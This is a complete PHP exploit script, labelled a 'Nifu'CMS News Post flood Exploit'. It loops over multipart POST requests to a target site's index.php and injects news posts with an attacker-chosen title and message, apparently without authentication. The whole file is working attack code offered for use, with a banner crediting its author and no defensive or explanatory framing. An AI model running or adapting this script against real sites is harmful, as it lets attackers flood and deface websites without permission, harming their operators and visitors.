<?php
/*
!Nifu_News
@HOST = 127.0.0.1 = Target HOST
@PORT = 80 = Target PORT
@PATH = / = CMS PATH
@TITLE = = News Title
@MESSAGE = = News Message
@REQ = 10 = Requests number
*/
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
 
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
function postit($host, $port, $path, $payload, $boundary)
{
$packet  = "POST {$path}index.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary={$boundary}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";

http_send($host,$packet);
}

print "\n+---------------------------------------------------------------+";
print "\n| Nifu'CMS News Post flood Exploit                              |";
print "\n|                                        by The UnKn0wN         |";
print "\n+---------------------------------------------------------------+\n";

$HOST = $argv[1];
$PORT = $argv[2];
$PATH = $argv[3];
$TITLE = $argv[4];
$MESSAGE = $argv[5];
$REQ = $argv[6];
print"\n[*] Sending News ...";
$boundary = "---------".str_replace(".", "", microtime());
$payload  = "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"addNews\"\r\n\r\n \r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"news_name\"\r\n\r\n{$TITLE}\r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"news_mess\"\r\n\r\n{$MESSAGE}\r\n";
$payload .= "--{$boundary}--\r\n";
for($i=0;$i<$REQ;$i++)
{
postit($HOST,$PORT,$PATH,$payload, $boundary);
}
print"Done!\n";
